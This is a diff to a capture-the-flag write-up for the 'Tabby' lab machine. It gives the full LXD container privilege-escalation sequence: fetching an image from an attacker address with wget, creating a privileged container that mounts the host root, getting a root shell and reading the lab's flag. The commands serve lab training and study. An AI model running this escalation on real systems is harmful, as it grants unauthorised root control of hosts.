@@ -430,22 +430,25 @@ wget 10.10.14.69/alpine.tar.gz
 lxc ls # see if there are any running. no.
 lxc image import alpine.tar.gz --alias alpine
 lxc image list
-lxc init alpine ignite -c security.privileged=true
+lxc init alpine ben -c security.privileged=true
 # error: No storage pool found. Please create a new storage pool
 
+# let's do that:
 lxd init
-# Note that I went with all of the defaults above, except for the “storage backend” which I set to use dir - a simple filesystem directory. Also I set IPv6 to none for more readable output.
-lxc init alpine ignite -c security.privileged=true # now it works.
-lxc config device add ignite 00be disk source=/ path=/mnt/root recursive=true
-lxc ls # find ignite.
+# choose all default options, except:
+  # dir as storage backend (easiest to setup)
 
-lxc start ignite
+lxc init alpine ben -c security.privileged=true # now it works.
+lxc config device add ben ben disk source=/ path=/mnt recursive=true # mount host root.
+lxc ls # find ben.
+
+lxc start ben
 lxc ls # we have an ip
-lxc exec ignite /bin/sh
+lxc exec ben /bin/sh # get our root shell.
 
 whoami # root!
-find / -iname 'root.txt' 2>/dev/null # /mnt/root/root/root.txt
-cat /mnt/root/root/root.txt # a81e399d36acc11885b57f6d745c36a0
+find / -iname 'root.txt' 2>/dev/null # /mnt/root/root.txt
+cat /mnt/root/root.txt # a81e399d36acc11885b57f6d745c36a0
 ```
 
 Tabby done!
